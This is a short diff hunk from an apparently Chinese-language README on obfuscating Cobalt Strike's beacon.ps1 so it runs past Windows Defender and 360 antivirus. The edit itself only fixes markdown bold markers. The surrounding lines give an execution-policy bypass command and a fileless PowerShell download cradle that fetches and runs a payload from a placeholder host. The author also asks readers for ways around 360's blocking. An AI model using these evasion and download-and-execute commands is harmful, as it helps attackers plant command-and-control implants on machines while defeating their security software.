@@ -68,7 +68,7 @@ Take beacon.ps1 as an example
 
 **Defender上线cs可以混淆beacon.ps1然后落地执行ps1脚本(powershell -ExecutionPolicy Bypass -File ./bypass.ps1)，也可以直接混淆cs的iex下载一句话IEX ((new-object net.webclient).downloadstring('http://ip:port/a')来直接cmd不落地执行脚本中的内容。**
 
-**360上线cs需要混淆beacon.ps1然后落地执行ps1脚本(powershell -ExecutionPolicy Bypass -File ./bypass.ps1)，cmd直接执行脚本中的内容会报命令执行（尝试了很久觉得360监控太过了。。很多正常语句也没办法执行），如果有师傅有好的解决办法欢迎来交流。
+**360上线cs需要混淆beacon.ps1然后落地执行ps1脚本(powershell -ExecutionPolicy Bypass -File ./bypass.ps1)，cmd直接执行脚本中的内容会报命令执行（尝试了很久觉得360监控太过了。。很多正常语句也没办法执行），如果有师傅有好的解决办法欢迎来交流。**
 
 混淆前VT如下：
 
